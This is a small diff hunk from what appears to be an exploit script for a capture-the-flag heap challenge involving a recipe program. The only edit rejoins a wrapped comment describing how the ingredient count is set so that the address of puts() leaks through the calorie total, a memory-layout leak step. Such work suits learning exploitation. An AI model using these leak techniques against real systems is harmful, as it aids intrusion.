@@ -53,8 +53,7 @@ f.write("a\n") # note: adding an ingredient calloc()'s two chunks on top of reci
 readuntil(f, "?")
 f.write("basil\n")
 readuntil(f, "?")
-f.write("1\n") # set to 1 so that the address of puts() can be leaked later via the "total cals" since program multipl
-ies cals per ingredient by number of ingred in recipe to get total
+f.write("1\n") # set to 1 so that the address of puts() can be leaked later via the "total cals" since program multiplies cals per ingredient by number of ingred in recipe to get total
 readuntil(f)
 f.write("d\n")
 readuntil(f)
